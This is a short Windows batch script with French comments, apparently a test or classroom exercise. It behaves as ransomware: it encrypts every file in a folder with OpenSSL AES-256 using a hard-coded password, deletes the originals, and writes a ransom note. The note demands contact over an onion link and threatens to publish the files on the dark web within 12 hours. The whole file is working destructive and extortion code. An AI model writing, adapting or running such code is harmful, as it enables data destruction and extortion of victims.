@echo off
setlocal enabledelayedexpansion

REM @2023-CEVIK Meryem

REM dossier source
set "source_folder=C:\Users\mcevi\OneDrive\Bureau\Mes_documents\Test1"

REM dossier de destination
set "encrypted_folder=C:\Users\mcevi\OneDrive\Bureau\Mes_documents\Test1\encrypted"

REM mot de passe pour le cryptage
set "mot_de_passe=HACK127_fOB0?a4?644x4aeR"

REM création du dossier encrypted (sil nexiste pas)
if not exist "%encrypted_folder%" mkdir "%encrypted_folder%"

REM partie Cryptage
for %%f in ("%source_folder%\*.*") do (
    openssl enc -aes-256-cbc -salt -pass "pass:%mot_de_passe%" -in "%%f" -out "%encrypted_folder%\%%~nxf.enc"
)

REM suppression fichiers sources
del /q "%source_folder%\*.*"

REM création  du fichier texte
echo YOUR FILES ARE ENCRYPTED > "%encrypted_folder%\lismoi.txt"
echo Don't worry, you can return all your files! >> "%encrypted_folder%\readme.txt"
echo. >> "%encrypted_folder%\readme.txt"
echo Install session messenger from this link : https://hack127.onion And chat with us. >> "%encrypted_folder%\readme.txt"
echo Your ID is: 6768 >> "%encrypted_folder%\readme.txt"
echo If you do not respond to us within 12 hours, your files will be published on the dark web. >> "%encrypted_folder%\readme.txt"
echo. >> "%encrypted_folder%\readme.txt"
echo Do not rename encrypted files. >> "%encrypted_folder%\readme.txt"
echo Do not try to decrypt your data using third party software, it may cause permanent data loss. >> "%encrypted_folder%\readme.txt"


REM Affichage d'une phrase dans une fenêtre de logiciel
echo Phrase à afficher dans la fenêtre du logiciel

REM Fin du script
endlocal
